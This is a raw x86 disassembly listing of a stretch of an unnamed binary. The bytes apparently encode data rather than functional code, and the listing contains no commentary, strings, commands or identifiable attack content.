  406f76:	3c 10                	cmp    $0x10,%al
  406f78:	47                   	inc    %edi
  406f79:	02 c1                	add    %cl,%al
  406f7b:	01 62 26             	add    %esp,0x26(%edx)
  406f7e:	16                   	push   %ss
  406f7f:	04 81                	add    $0x81,%al
  406f81:	02 39                	add    (%ecx),%bh
  406f83:	1f                   	pop    %ds
  406f84:	13 05 81 02 28 18    	adc    0x18280281,%eax
  406f8a:	0e                   	push   %cs
  406f8b:	00 89 02 53 1e 0e    	add    %cl,0xe1e5302(%ecx)
  406f91:	00 89 02 f4 0f 6b    	add    %cl,0x6b0ff402(%ecx)
  406f97:	01 b1 02 de 0f 47    	add    %esi,0x470fde02(%ecx)
  406f9d:	02 a1 02 d4 19 c7    	add    -0x38e62bfe(%ecx),%ah
  406fa3:	00 c1                	add    %al,%cl
  406fa5:	01 66 21             	add    %esp,0x21(%esi)
  406fa8:	1a 05 89 02 02 21    	sbb    0x21020289,%al
  406fae:	6b 01 89             	imul   $0xffffff89,(%ecx),%eax
  406fb1:	02 bb 0f 20 05 89    	add    -0x76fadff1(%ebx),%bh
  406fb7:	02 b3 24 4b 02 81    	add    -0x7efdb4dc(%ebx),%dh
  406fbd:	02 69 23             	add    0x23(%ecx),%ch
  406fc0:	27                   	daa
  406fc1:	05 c1 02 a9 1d       	add    $0x1da902c1,%eax
  406fc6:	30 05 c9 02 09 11    	xor    %al,0x110902c9
  406fcc:	c7 00 91 02 bd 25    	movl   $0x25bd0291,(%eax)
  406fd2:	35 05 c1 01 66       	xor    $0x6601c105,%eax
  406fd7:	21 3f                	and    %edi,(%edi)
  406fd9:	05 91 02 2a 13       	add    $0x132a0291,%eax
  406fde:	46                   	inc    %esi
  406fdf:	05 d9 02 1d 21       	add    $0x211d02d9,%eax
  406fe4:	84 00                	test   %al,(%eax)
  406fe6:	d9 02                	flds   (%edx)
  406fe8:	43                   	inc    %ebx
  406fe9:	11 3e                	adc    %edi,(%esi)
  406feb:	01 e1                	add    %esp,%ecx
  406fed:	02 53 1e             	add    0x1e(%ebx),%dl
  406ff0:	4c                   	dec    %esp
  406ff1:	05 d9 02 98 1f       	add    $0x1f9802d9,%eax
  406ff6:	2a 01                	sub    (%ecx),%al
  406ff8:	a1 02 01 10 c3       	mov    0xc3100102,%eax
  406ffd:	00 c1                	add    %al,%cl
  406fff:	01 66 21             	add    %esp,0x21(%esi)
  407002:	01 05 99 02 53 1e    	add    %eax,0x1e530299
  407008:	6b 01 f1             	imul   $0xfffffff1,(%ecx),%eax
  40700b:	02 8f 10 6b 01 a1    	add    -0x5efe94f0(%edi),%cl
  407011:	02 c0                	add    %al,%al
  407013:	15 c3 00 a1 02       	adc    $0x2a100c3,%eax
  407018:	11 10                	adc    %edx,(%eax)
  40701a:	c7 00 89 02 52 15    	movl   $0x15520289,(%eax)
  407020:	4b                   	dec    %ebx
  407021:	02 89 02 e2 12 4b    	add    0x4b12e202(%ecx),%cl
  407027:	02 59 01             	add    0x1(%ecx),%bl
  40702a:	77 23                	ja     0x40704f
  40702c:	3e 01 59 01          	add    %ebx,%ds:0x1(%ecx)
  407030:	39 26                	cmp    %esp,(%esi)
  407032:	c3                   	ret
  407033:	00 a1 02 4a 23 c7    	add    %ah,-0x38dcb5fe(%ecx)
  407039:	00 f9                	add    %bh,%cl
  40703b:	02 53 1e             	add    0x1e(%ebx),%dl
  40703e:	6b 01 f9             	imul   $0xfffffff9,(%ecx),%eax
  407041:	02 6f 13             	add    0x13(%edi),%ch
  407044:	23 02                	and    (%edx),%eax
  407046:	01 03                	add    %eax,(%ebx)
  407048:	53                   	push   %ebx
  407049:	1e                   	push   %ds
  40704a:	0e                   	push   %cs
  40704b:	00 01                	add    %al,(%ecx)
  40704d:	03 2d 10 47 02 c1    	add    0xc1024710,%ebp
  407053:	01 e0                	add    %esp,%eax
  407055:	1d 47 02 c1 01       	sbb    $0x1c10247,%eax
  40705a:	69 20 42 02 09 03    	imul   $0x3090242,(%eax),%esp
  407060:	53                   	push   %ebx
  407061:	1e                   	push   %ds
  407062:	6b 01 09             	imul   $0x9,(%ecx),%eax
  407065:	03 b6 21 6a 05 11    	add    0x11056a21(%esi),%esi
  40706b:	03 3b                	add    (%ebx),%edi
  40706d:	1e                   	push   %ds
  40706e:	70 05                	jo     0x407075
  407070:	19 03                	sbb    %eax,(%ebx)
  407072:	e8 22 76 05 21       	call   0x2145e699
  407077:	03 e9                	add    %ecx,%ebp
  407079:	18 7c 05 c1          	sbb    %bh,-0x3f(%ebp,%eax,1)
  40707d:	01 43 22             	add    %eax,0x22(%ebx)
  407080:	47                   	inc    %edi
  407081:	02 19                	add    (%ecx),%bl
  407083:	03 a6 23 bf 01 81    	add    -0x7efe40dd(%esi),%esp
  407089:	02 09                	add    (%ecx),%cl
  40708b:	0f 86 05 29 03 49    	jbe    0x49439996
  407091:	00 f4                	add    %dh,%ah
  407093:	01 59 01             	add    %ebx,0x1(%ecx)
  407096:	37                   	aaa
  407097:	23 7b 00             	and    0x0(%ebx),%edi
  40709a:	59                   	pop    %ecx
  40709b:	01 49 10             	add    %ecx,0x10(%ecx)
  40709e:	c3                   	ret
  40709f:	00 59 01             	add    %bl,0x1(%ecx)
  4070a2:	1d 10 c3 00 59       	sbb    $0x5900c310,%eax
  4070a7:	01 f0                	add    %esi,%eax
  4070a9:	19 93 05 c1 01 66    	sbb    %edx,0x6601c105(%ebx)
  4070af:	21 99 05 49 03 53    	and    %ebx,0x53034905(%ecx)
  4070b5:	1e                   	push   %ds
  4070b6:	0e                   	push   %cs
  4070b7:	00 61 01             	add    %ah,0x1(%ecx)
  4070ba:	d7                   	xlat   %ds:(%ebx)
  4070bb:	03 cd                	add    %ebp,%ecx
  4070bd:	03 51 03             	add    0x3(%ecx),%edx
  4070c0:	90                   	nop
  4070c1:	15 75 01 69 00       	adc    $0x690175,%eax
  4070c6:	53                   	push   %ebx
  4070c7:	1e                   	push   %ds
  4070c8:	0e                   	push   %cs
  4070c9:	00 21                	add    %ah,(%ecx)
  4070cb:	02 da                	add    %dl,%bl
  4070cd:	14 70                	adc    $0x70,%al
  4070cf:	01 69 00             	add    %ebp,0x0(%ecx)
  4070d2:	b9 0d aa 05 c1       	mov    $0xc105aa0d,%ecx
  4070d7:	01 07                	add    %eax,(%edi)
  4070d9:	15 b0 05 c1 01       	adc    $0x1c105b0,%eax
  4070de:	a1 1d 47 02 c1       	mov    0xc102471d,%eax
  4070e3:	01 1a                	add    %ebx,(%edx)
  4070e5:	0e                   	push   %cs
  4070e6:	bd 05 59 01 f2       	mov    $0xf2015905,%ebp
  4070eb:	18 1d 00 61 03 da    	sbb    %bl,0xda036100
  4070f1:	14 47                	adc    $0x47,%al
  4070f3:	02 69 03             	add    0x3(%ecx),%ch
  4070f6:	ad                   	lods   %ds:(%esi),%eax
  4070f7:	15 c3 00 b1 02       	adc    $0x2b100c3,%eax
  4070fc:	6d                   	insl   (%dx),%es:(%edi)
  4070fd:	10 c3                	adc    %al,%bl
  4070ff:	05 59 03 7f 10       	add    $0x107f0359,%eax
  407104:	c3                   	ret
  407105:	05 59 03 da 14       	add    $0x14da0359,%eax
  40710a:	47                   	inc    %edi
  40710b:	02 71 03             	add    0x3(%ecx),%dh
  40710e:	f4                   	hlt
  40710f:	22 c9                	and    %cl,%cl
  407111:	05 79 03 53 1e       	add    $0x1e530379,%eax
  407116:	cf                   	iret
  407117:	05 79 03 74 0f       	add    $0xf740379,%eax
  40711c:	d6                   	salc
  40711d:	05 c1 00 f5 10       	add    $0x10f500c1,%eax
  407122:	0e                   	push   %cs
  407123:	00 19                	add    %bl,(%ecx)
  407125:	00 f5                	add    %dh,%ch
  407127:	10 0e                	adc    %cl,(%esi)
  407129:	00 09                	add    %cl,(%ecx)
  40712b:	03 53 1e             	add    0x1e(%ebx),%edx
  40712e:	36 02 0c 00          	add    %ss:(%eax,%eax,1),%cl
  407132:	53                   	push   %ebx
  407133:	1e                   	push   %ds
  407134:	0e                   	push   %cs
  407135:	00 0c 00             	add    %cl,(%eax,%eax,1)
  407138:	32 0c f5 05 0c 00 2d 	xor    0x2d000c05(,%esi,8),%cl
  40713f:	23 f4                	and    %esp,%esi
  407141:	01 0c 00             	add    %ecx,(%eax,%eax,1)
  407144:	7c 25                	jl     0x40716b
  407146:	fb                   	sti
  407147:	05 c1 01 c4 19       	add    $0x19c401c1,%eax
  40714c:	01 06                	add    %eax,(%esi)
  40714e:	51                   	push   %ecx
  40714f:	00 98 20 11 06 51    	add    %bl,0x51061120(%eax)
  407155:	00 ce                	add    %cl,%dh
  407157:	01 17                	add    %edx,(%edi)
  407159:	06                   	push   %es
  40715a:	59                   	pop    %ecx
  40715b:	00 81 0c 17 06 89    	add    %al,-0x76f9e8f4(%ecx)
  407161:	03 56 26             	add    0x26(%esi),%edx
  407164:	1d 06 69 00 53       	sbb    $0x53006906,%eax
  407169:	1e                   	push   %ds
  40716a:	01 03                	add    %eax,(%ebx)
  40716c:	61                   	popa
  40716d:	00 53 1e             	add    %dl,0x1e(%ebx)
  407170:	2d 06 91 03 f5       	sub    $0xf5039106,%eax
  407175:	10 0e                	adc    %cl,(%esi)
  407177:	00 99 03 53 1e 56    	add    %bl,0x561e5303(%ecx)
  40717d:	04 a1                	add    $0xa1,%al
  40717f:	03 5b 14             	add    0x14(%ebx),%ebx
  407182:	35 06 81 02 60       	xor    $0x60028106,%eax
  407187:	0e                   	push   %cs
  407188:	0a 00                	or     (%eax),%al
  40718a:	91                   	xchg   %eax,%ecx
  40718b:	02 b0 25 35 05 91    	add    -0x6efacadb(%eax),%dh
  407191:	02 2a                	add    (%edx),%ch
  407193:	13 43 06             	adc    0x6(%ebx),%eax
  407196:	89 01                	mov    %eax,(%ecx)
  407198:	c8 0e 47 02          	enter  $0x470e,$0x2
  40719c:	91                   	xchg   %eax,%ecx
  40719d:	02 b0 25 54 06 91    	add    -0x6ef9abdb(%eax),%dh
  4071a3:	02 21                	add    (%ecx),%ah
  4071a5:	13 7c 05 91          	adc    -0x6f(%ebp,%eax,1),%edi
  4071a9:	02 15 13 6b 01 91    	add    0x91016b13,%dl
  4071af:	02 bd 25 5e 06 91    	add    -0x6ef9a1db(%ebp),%bh
  4071b5:	02 b7 0e 6b 01 1c    	add    0x1c016b0e(%edi),%dh
  4071bb:	00 32                	add    %dh,(%edx)
  4071bd:	0c f5                	or     $0xf5,%al
  4071bf:	05 b9 03 80 23       	add    $0x238003b9,%eax
  4071c4:	7c 06                	jl     0x4071cc
  4071c6:	1c 00                	sbb    $0x0,%al
  4071c8:	3b 1e                	cmp    (%esi),%ebx
  4071ca:	92                   	xchg   %eax,%edx
  4071cb:	06                   	push   %es
  4071cc:	24 00                	and    $0x0,%al
  4071ce:	e8 22 a4 06 1c       	call   0x1c4715f5
  4071d3:	00 5a 13             	add    %bl,0x13(%edx)
  4071d6:	a9 06 24 00 a6       	test   $0xa6002406,%eax
  4071db:	23 bf 01 c9 03 b2    	and    -0x4dfc36ff(%edi),%edi
  4071e1:	19 b3 06 c9 03 2d    	sbb    %esi,0x2d03c906(%ebx)
  4071e7:	0c b9                	or     $0xb9,%al
  4071e9:	06                   	push   %es
  4071ea:	d1 03                	roll   $1,(%ebx)
  4071ec:	cc                   	int3
  4071ed:	10 c1                	adc    %al,%cl
  4071ef:	06                   	push   %es
  4071f0:	e1 03                	loope  0x4071f5
  4071f2:	22 0e                	and    (%esi),%cl
  4071f4:	c8 06 d9 03          	enter  $0xd906,$0x3
  4071f8:	49                   	dec    %ecx
  4071f9:	0f cf                	bswap  %edi
  4071fb:	06                   	push   %es
  4071fc:	f1                   	int1
  4071fd:	03 24 11             	add    (%ecx,%edx,1),%esp
  407200:	d8 06                	fadds  (%esi)
  407202:	01 04 a2             	add    %eax,(%edx,%eiz,4)
  407205:	1c e2                	sbb    $0xe2,%al
  407207:	06                   	push   %es
  407208:	2c 00                	sub    $0x0,%al
  40720a:	24 11                	and    $0x11,%al
  40720c:	17                   	pop    %ss
  40720d:	07                   	pop    %es
  40720e:	2c 00                	sub    $0x0,%al
  407210:	c5 21                	lds    (%ecx),%esp
  407212:	23 07                	and    (%edi),%eax
  407214:	34 00                	xor    $0x0,%al
  407216:	e1 0e                	loope  0x407226
  407218:	3b 07                	cmp    (%edi),%eax
  40721a:	1c 00                	sbb    $0x0,%al
  40721c:	53                   	push   %ebx
  40721d:	1e                   	push   %ds
  40721e:	0e                   	push   %cs
  40721f:	00 c1                	add    %al,%cl
  407221:	01 94 26 84 00 21 04 	add    %edx,0x4210084(%esi,%eiz,1)
  407228:	53                   	push   %ebx
  407229:	1e                   	push   %ds
  40722a:	6b 01 19             	imul   $0x19,(%ecx),%eax
  40722d:	04 53                	add    $0x53,%al
  40722f:	1e                   	push   %ds
  407230:	59                   	pop    %ecx
  407231:	07                   	pop    %es
  407232:	29 04 a5 1f 61 07 51 	sub    %eax,0x5107611f(,%eiz,4)
  407239:	01 bc 14 93 01 49 04 	add    %edi,0x4490193(%esp,%edx,1)
  407240:	53                   	push   %ebx
  407241:	1e                   	push   %ds
  407242:	6b 01 59             	imul   $0x59,(%ecx),%eax
  407245:	02 53 1e             	add    0x1e(%ebx),%dl
  407248:	0e                   	push   %cs
  407249:	00 31                	add    %dh,(%ecx)
  40724b:	04 53                	add    $0x53,%al
  40724d:	1e                   	push   %ds
  40724e:	0e                   	push   %cs
  40724f:	00 51 04             	add    %dl,0x4(%ecx)
  407252:	c4 13                	les    (%ebx),%edx
  407254:	01 03                	add    %eax,(%ebx)
  407256:	51                   	push   %ecx
  407257:	04 61                	add    $0x61,%al
  407259:	13 01                	adc    (%ecx),%eax
  40725b:	03 51 04             	add    0x4(%ecx),%edx
  40725e:	42                   	inc    %edx
  40725f:	0e                   	push   %cs
  407260:	7a 07                	jp     0x407269
  407262:	51                   	push   %ecx
  407263:	04 4f                	add    $0x4f,%al
  407265:	14 81                	adc    $0x81,%al
  407267:	07                   	pop    %es
  407268:	51                   	push   %ecx
  407269:	04 a8                	add    $0xa8,%al
  40726b:	25 2b 02 51 04       	and    $0x451022b,%eax
  407270:	9c                   	pushf
  407271:	08 0e                	or     %cl,(%esi)
  407273:	00 51 04             	add    %dl,0x4(%ecx)
  407276:	78 1e                	js     0x407296
  407278:	88 07                	mov    %al,(%edi)
  40727a:	39 04 53             	cmp    %eax,(%ebx,%edx,2)
  40727d:	1e                   	push   %ds
  40727e:	8e 07                	mov    (%edi),%es
  407280:	51                   	push   %ecx
  407281:	04 7e                	add    $0x7e,%al
  407283:	08 31                	or     %dh,(%ecx)
  407285:	02 39                	add    (%ecx),%bh
  407287:	04 17                	add    $0x17,%al
  407289:	17                   	pop    %ss
  40728a:	0e                   	push   %cs
  40728b:	00 41 04             	add    %al,0x4(%ecx)
  40728e:	53                   	push   %ebx
  40728f:	1e                   	push   %ds
  407290:	2b 02                	sub    (%edx),%eax
  407292:	59                   	pop    %ecx
  407293:	02 7c 25 31          	add    0x31(%ebp,%eiz,1),%bh
  407297:	02 51 03             	add    0x3(%ecx),%dl
  40729a:	90                   	nop
  40729b:	15 9a 07 79 04       	adc    $0x479079a,%eax
  4072a0:	53                   	push   %ebx
  4072a1:	1e                   	push   %ds
  4072a2:	6b 01 51             	imul   $0x51,(%ecx),%eax
  4072a5:	04 85                	add    $0x85,%al
  4072a7:	08 2b                	or     %ch,(%ebx)
  4072a9:	02 51 04             	add    0x4(%ecx),%dl
  4072ac:	68 1e 88 07 c1       	push   $0xc107881e
  4072b1:	00 cc                	add    %cl,%ah
  4072b3:	15 23 02 81 04       	adc    $0x4810223,%eax
  4072b8:	26 26 be 07 91 04 6c 	es es mov $0x6c049107,%esi
  4072bf:	25 d0 07 a1 04       	and    $0x4a107d0,%eax
  4072c4:	53                   	push   %ebx
  4072c5:	1e                   	push   %ds
  4072c6:	0e                   	push   %cs
  4072c7:	00 c1                	add    %al,%cl
  4072c9:	01 72 21             	add    %esi,0x21(%edx)
  4072cc:	f9                   	stc
  4072cd:	07                   	pop    %es
  4072ce:	49                   	dec    %ecx
  4072cf:	02 a5 1f 99 01 49    	add    0x4901991f(%ebp),%ah
  4072d5:	02 a5 1f ab 01 a9    	add    -0x56fe54e1(%ebp),%ah
  4072db:	00 53 1e             	add    %dl,0x1e(%ebx)
  4072de:	0e                   	push   %cs
  4072df:	00 1c 00             	add    %bl,(%eax,%eax,1)
  4072e2:	e9 18 06 08 1c       	jmp    0x1c4878ff
  4072e7:	00 2d 23 f4 01 1c    	add    %ch,0x1c01f423
  4072ed:	00 97 1c 0e 00 c1    	add    %dl,-0x3efff1e4(%edi)
  4072f3:	01 3c 20             	add    %edi,(%eax,%eiz,1)
  4072f6:	42                   	inc    %edx
  4072f7:	02 c1                	add    %cl,%al
  4072f9:	00 ff                	add    %bh,%bh
  4072fb:	12 28                	adc    (%eax),%ch
  4072fd:	08 49 02             	or     %cl,0x2(%ecx)
  407300:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  407301:	1f                   	pop    %ds
  407302:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  407303:	01 51 01             	add    %edx,0x1(%ecx)
  407306:	62 00                	bound  %eax,(%eax)
  407308:	32 08                	xor    (%eax),%cl
  40730a:	c1 01 42             	roll   $0x42,(%ecx)
  40730d:	19 47 02             	sbb    %eax,0x2(%edi)
  407310:	a9 04 03 11 37       	test   $0x37110304,%eax
  407315:	08 51 01             	or     %dl,0x1(%ecx)
  407318:	62 00                	bound  %eax,(%eax)
  40731a:	3c 08                	cmp    $0x8,%al
  40731c:	51                   	push   %ecx
  40731d:	01 62 00             	add    %esp,0x0(%edx)
  407320:	41                   	inc    %ecx
  407321:	08 51 01             	or     %dl,0x1(%ecx)
  407324:	62 00                	bound  %eax,(%eax)
  407326:	46                   	inc    %esi
  407327:	08 51 01             	or     %dl,0x1(%ecx)
  40732a:	6b 00 4d             	imul   $0x4d,(%eax),%eax
  40732d:	08 41 03             	or     %al,0x3(%ecx)
  407330:	03 11                	add    (%ecx),%edx
  407332:	52                   	push   %edx
  407333:	08 51 01             	or     %dl,0x1(%ecx)
  407336:	6b 00 57             	imul   $0x57,(%eax),%eax
  407339:	08 51 01             	or     %dl,0x1(%ecx)
  40733c:	6b 00 5c             	imul   $0x5c,(%eax),%eax
  40733f:	08 51 01             	or     %dl,0x1(%ecx)
  407342:	6b 00 61             	imul   $0x61,(%eax),%eax
  407345:	08 51 01             	or     %dl,0x1(%ecx)
  407348:	00 0f                	add    %cl,(%edi)
  40734a:	68 08 b1 04 03       	push   $0x304b108
  40734f:	11 6d 08             	adc    %ebp,0x8(%ebp)
  407352:	49                   	dec    %ecx
  407353:	02 a5 1f 7a 08 59    	add    0x59087a1f(%ebp),%ah
  407359:	03 30                	add    (%eax),%esi
  40735b:	26 23 02             	and    %es:(%edx),%eax
  40735e:	e1 02                	loope  0x407362
  407360:	53                   	push   %ebx
  407361:	1e                   	push   %ds
  407362:	88 08                	mov    %cl,(%eax)
  407364:	c1 00 f6             	roll   $0xf6,(%eax)
  407367:	12 f4                	adc    %ah,%dh
  407369:	01 89 01 53 1e 6b    	add    %ecx,0x6b1e5301(%ecx)
  40736f:	01 49 02             	add    %ecx,0x2(%ecx)
  407372:	73 00                	jae    0x407374
  407374:	b6 08                	mov    $0x8,%dh
  407376:	49                   	dec    %ecx
  407377:	02 66 0f             	add    0xf(%esi),%ah
  40737a:	bd 08 49 02 00       	mov    $0x24908,%ebp
  40737f:	0f c4 08 49          	pinsrw $0x49,(%eax),%mm1
  407383:	02 40 00             	add    0x0(%eax),%al
  407386:	cb                   	lret
  407387:	08 49 02             	or     %cl,0x2(%ecx)
  40738a:	62 00                	bound  %eax,(%eax)
  40738c:	d2 08                	rorb   %cl,(%eax)
  40738e:	49                   	dec    %ecx
  40738f:	02 7c 00 d9          	add    -0x27(%eax,%eax,1),%bh
  407393:	08 49 02             	or     %cl,0x2(%ecx)
  407396:	6b 00 e0             	imul   $0xffffffe0,(%eax),%eax
  407399:	08 49 02             	or     %cl,0x2(%ecx)
  40739c:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40739d:	1f                   	pop    %ds
  40739e:	12 09                	adc    (%ecx),%cl
  4073a0:	d1 04 53             	roll   $1,(%ebx,%edx,2)
  4073a3:	1e                   	push   %ds
  4073a4:	28 09                	sub    %cl,(%ecx)
  4073a6:	09 00                	or     %eax,(%eax)
  4073a8:	80 00 0d             	addb   $0xd,(%eax)
  4073ab:	01 09                	add    %ecx,(%ecx)
  4073ad:	00 84 00 12 01 09 00 	add    %al,0x90112(%eax,%eax,1)
  4073b4:	88 00                	mov    %al,(%eax)
  4073b6:	17                   	pop    %ss
  4073b7:	01 08                	add    %ecx,(%eax)
  4073b9:	00 98 00 5c 01 08    	add    %bl,0x8015c00(%eax)
  4073bf:	00 9c 00 61 01 08 00 	add    %bl,0x80161(%eax,%eax,1)
  4073c6:	a0 00 66 01 08       	mov    0x8016600,%al
  4073cb:	00 a4 00 5c 01 08 00 	add    %ah,0x8015c(%eax,%eax,1)
  4073d2:	ec                   	in     (%dx),%al
  4073d3:	00 7f 02             	add    %bh,0x2(%edi)
  4073d6:	08 00                	or     %al,(%eax)
  4073d8:	f0 00 17             	lock add %dl,(%edi)
  4073db:	01 08                	add    %ecx,(%eax)
  4073dd:	00 f4                	add    %dh,%ah
  4073df:	00 12                	add    %dl,(%edx)
  4073e1:	01 08                	add    %ecx,(%eax)
  4073e3:	00 f8                	add    %bh,%al
  4073e5:	00 84 02 08 00 fc 00 	add    %al,0xfc0008(%edx,%eax,1)
  4073ec:	89 02                	mov    %eax,(%edx)
  4073ee:	08 00                	or     %al,(%eax)
  4073f0:	00 01                	add    %al,(%ecx)
  4073f2:	8e 02                	mov    (%edx),%es
  4073f4:	08 00                	or     %al,(%eax)
  4073f6:	04 01                	add    $0x1,%al
  4073f8:	93                   	xchg   %eax,%ebx
  4073f9:	02 08                	add    (%eax),%cl
  4073fb:	00 08                	add    %cl,(%eax)
  4073fd:	01 98 02 08 00 0c    	add    %ebx,0xc000802(%eax)
  407403:	01 9d 02 08 00 10    	add    %ebx,0x10000802(%ebp)
  407409:	01 a2 02 08 00 14    	add    %esp,0x14000802(%edx)
  40740f:	01 a7 02 08 00 18    	add    %esp,0x18000802(%edi)
  407415:	01 ac 02 2e 00 2b 00 	add    %ebp,0x2b002e(%edx,%eax,1)
  40741c:	06                   	push   %es
  40741d:	03 2e                	add    (%esi),%ebp
  40741f:	00 33                	add    %dh,(%ebx)
  407421:	00 0f                	add    %cl,(%edi)
  407423:	03 2e                	add    (%esi),%ebp
  407425:	00 3b                	add    %bh,(%ebx)
  407427:	00 34 03             	add    %dh,(%ebx,%eax,1)
  40742a:	2e 00 43 00          	add    %al,%cs:0x0(%ebx)
  40742e:	3d 03 2e 00 4b       	cmp    $0x4b002e03,%eax
  407433:	00 3d 03 2e 00 53    	add    %bh,0x53002e03
  407439:	00 3d 03 2e 00 5b    	add    %bh,0x5b002e03
  40743f:	00 3d 03 2e 00 63    	add    %bh,0x63002e03
  407445:	00 3d 03 2e 00 6b    	add    %bh,0x6b002e03
  40744b:	00 3d 03 2e 00 73    	add    %bh,0x73002e03
  407451:	00 3d 03 2e 00 7b    	add    %bh,0x7b002e03
  407457:	00 43 03             	add    %al,0x3(%ebx)
  40745a:	2e 00 83 00 50 03 2e 	add    %al,%cs:0x2e035000(%ebx)
  407461:	00 8b 00 3d 03 c0    	add    %cl,-0x3ffcc300(%ebx)
  407467:	00 93 00 17 01 e0    	add    %dl,-0x1ffee900(%ebx)
  40746d:	00 93 00 17 01 00    	add    %dl,0x11700(%ebx)
  407473:	01 93 00 17 01 20    	add    %edx,0x20011700(%ebx)
  407479:	01 93 00 17 01 40    	add    %edx,0x40011700(%ebx)
  40747f:	01 93 00 17 01 60    	add    %edx,0x60011700(%ebx)
  407485:	01 93 00 17 01 80    	add    %edx,-0x7ffee900(%ebx)
  40748b:	01 93 00 17 01 a0    	add    %edx,-0x5ffee900(%ebx)
  407491:	01 93 00 17 01 c0    	add    %edx,-0x3ffee900(%ebx)
  407497:	01 93 00 17 01 e0    	add    %edx,-0x1ffee900(%ebx)
  40749d:	01 93 00 17 01 00    	add    %edx,0x11700(%ebx)
  4074a3:	02 93 00 17 01 03    	add    0x3011700(%ebx),%dl
  4074a9:	02 93 00 17 01 20    	add    0x20011700(%ebx),%dl
  4074af:	02 93 00 17 01 40    	add    0x40011700(%ebx),%dl
  4074b5:	02 93 00 17 01 60    	add    0x60011700(%ebx),%dl
  4074bb:	02 93 00 17 01 61    	add    0x61011700(%ebx),%dl
  4074c1:	02 93 00 17 01 63    	add    0x63011700(%ebx),%dl
  4074c7:	02 93 00 17 01 80    	add    -0x7ffee900(%ebx),%dl
  4074cd:	02 93 00 17 01 81    	add    -0x7efee900(%ebx),%dl
  4074d3:	02 93 00 17 01 a0    	add    -0x5ffee900(%ebx),%dl
  4074d9:	02 93 00 17 01 a1    	add    -0x5efee900(%ebx),%dl
  4074df:	02 93 00 17 01 c0    	add    -0x3ffee900(%ebx),%dl
  4074e5:	02 93 00 17 01 c1    	add    -0x3efee900(%ebx),%dl
  4074eb:	02 93 00 17 01 e0    	add    -0x1ffee900(%ebx),%dl
  4074f1:	02 93 00 17 01 e1    	add    -0x1efee900(%ebx),%dl
  4074f7:	02 93 00 17 01 e3    	add    -0x1cfee900(%ebx),%dl
  4074fd:	02 9b 00 b6 03 00    	add    0x3b600(%ebx),%bl
  407503:	03 93 00 17 01 01    	add    0x1011700(%ebx),%edx
  407509:	03 93 00 17 01 20    	add    0x20011700(%ebx),%edx
  40750f:	03 93 00 17 01 21    	add    0x21011700(%ebx),%edx
  407515:	03 93 00 17 01 40    	add    0x40011700(%ebx),%edx
  40751b:	03 93 00 17 01 41    	add    0x41011700(%ebx),%edx
  407521:	03 93 00 17 01 61    	add    0x61011700(%ebx),%edx
  407527:	03 93 00 17 01 81    	add    -0x7efee900(%ebx),%edx
  40752d:	03 93 00 17 01 a1    	add    -0x5efee900(%ebx),%edx
  407533:	03 93 00 17 01 a3    	add    -0x5cfee900(%ebx),%edx
  407539:	03 93 00 17 01 01    	add    0x1011700(%ebx),%edx
  40753f:	00 20                	add    %ah,(%eax)
  407541:	00 00                	add    %al,(%eax)
  407543:	00 14 00             	add    %dl,(%eax,%eax,1)
  407546:	01 00                	add    %eax,(%eax)
  407548:	06                   	push   %es
  407549:	00 00                	add    %al,(%eax)
  40754b:	00 1e                	add    %bl,(%esi)
  40754d:	00 c0                	add    %al,%al
  40754f:	03 c9                	add    %ecx,%ecx
  407551:	03 f4                	add    %esp,%esi
  407553:	03 9c 04 c2 04 e6 04 	add    0x4e604c2(%esp,%eax,1),%ebx
  40755a:	54                   	push   %esp
  40755b:	05 59 05 81 05       	add    $0x5810559,%eax
  407560:	8a 05 8f 05 9f 05    	mov    0x59f058f,%al
  407566:	b6 05                	mov    $0x5,%dh
  407568:	dd 05 08 06 27 06    	fldl   0x6270608
  40756e:	3c 06                	cmp    $0x6,%al
  407570:	4c                   	dec    %esp
  407571:	06                   	push   %es
  407572:	66 06                	pushw  %es
  407574:	af                   	scas   %es:(%edi),%eax
  407575:	06                   	push   %es
  407576:	53                   	push   %ebx
  407577:	07                   	pop    %es
  407578:	67 07                	addr16 pop %es
  40757a:	a3 07 cb 07 da       	mov    %eax,0xda07cb07
  40757f:	07                   	pop    %es
  407580:	e8 07 f0 07 ff       	call   0xff48658c
  407585:	07                   	pop    %es
  407586:	0c 08                	or     $0x8,%al
  407588:	11 08                	adc    %ecx,(%eax)
  40758a:	20 08                	and    %cl,(%eax)
  40758c:	2d 08 72 08 80       	sub    $0x80087208,%eax
  407591:	08 96 08 a2 08 a8    	or     %dl,-0x57f75df8(%esi)
  407597:	08 ae 08 e7 08 f1    	or     %ch,-0xef718f8(%esi)
  40759d:	08 f7                	or     %dh,%bh
  40759f:	08 fc                	or     %bh,%ah
  4075a1:	08 02                	or     %al,(%edx)
  4075a3:	09 0b                	or     %ecx,(%ebx)
  4075a5:	09 18                	or     %ebx,(%eax)
  4075a7:	09 31                	or     %esi,(%ecx)
  4075a9:	09 04 00             	or     %eax,(%eax,%eax,1)
  4075ac:	01 00                	add    %eax,(%eax)
  4075ae:	16                   	push   %ss
  4075af:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4075b2:	17                   	pop    %ss
  4075b3:	00 0d 00 18 00 0f    	add    %cl,0xf001800
  4075b9:	00 00                	add    %al,(%eax)
  4075bb:	00 4a 08             	add    %cl,0x8(%edx)
  4075be:	9f                   	lahf
  4075bf:	00 00                	add    %al,(%eax)
  4075c1:	00 e2                	add    %ah,%dl
  4075c3:	25 a4 00 00 00       	and    $0xa4,%eax
  4075c8:	0b 0b                	or     (%ebx),%ecx
  4075ca:	a9 00 00 00 85       	test   $0x85000000,%eax
  4075cf:	24 ae                	and    $0xae,%al
  4075d1:	00 00                	add    %al,(%eax)
  4075d3:	00 95 0a ae 00 00    	add    %dl,0xae0a(%ebp)
  4075d9:	00 e5                	add    %ah,%ch
  4075db:	23 b2 00 00 00 d7    	and    -0x29000000(%edx),%esi
  4075e1:	02 b7 00 00 00 c3    	add    -0x3d000000(%edi),%dh
  4075e7:	07                   	pop    %es
  4075e8:	bb 00 00 00 24       	mov    $0x24000000,%ebx
  4075ed:	27                   	daa
  4075ee:	b2 00                	mov    $0x0,%dl
  4075f0:	00 00                	add    %al,(%eax)
  4075f2:	e8 15 bf 00 00       	call   0x41350c
  4075f7:	00 cb                	add    %cl,%bl
  4075f9:	0a b7 00 00 00 34    	or     0x34000000(%edi),%dh
  4075ff:	04 c3                	add    $0xc3,%al
  407601:	01 00                	add    %eax,(%eax)
  407603:	00 01                	add    %al,(%ecx)
